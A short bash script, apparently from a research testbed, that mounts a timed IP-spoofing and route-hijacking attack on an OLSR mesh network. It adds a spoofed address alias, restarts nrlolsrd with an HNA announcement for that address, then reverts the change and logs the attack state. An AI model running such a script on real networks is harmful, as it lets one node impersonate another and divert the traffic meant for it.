#!/bin/bash 
startTime=$1
pendingDuration=$2
nodeToSpoof=$3
logPath=$4
ipToSpoof="10.0.0.$nodeToSpoof"

echo "none" > $logPath/attack.txt
sleep $startTime

if [ $pendingDuration -gt 0 ]
then
	echo "spoof_"$ipToSpoof > $logPath/attack.txt

	ifconfig eth0:1 $ipToSpoof netmask 255.255.255.255 up

	#check if its olsrd running:
	if [[ $logPath == *"OLSR"* ]]
	then
		echo "HNA $ipToSpoof 32" > $logPath/tmp.txt
		killall nrlolsrd
#		sleep 1
		ifconfig eth0:1 $ipToSpoof netmask 255.255.255.255 up
		nrlolsrd -i eth0 -hna $logPath/tmp.txt &
#		changed to allow the attack for duration regardless of start time
        sleep $pendingDuration
		killall nrlolsrd
		ifconfig "eth0:1" down
		nrlolsrd -i eth0 &
	else
#		changed to allow the attack for duration regardless of start time
        sleep $pendingDuration
		ifconfig "eth0:1" down
	fi
fi

echo "none" > $logPath/attack.txt



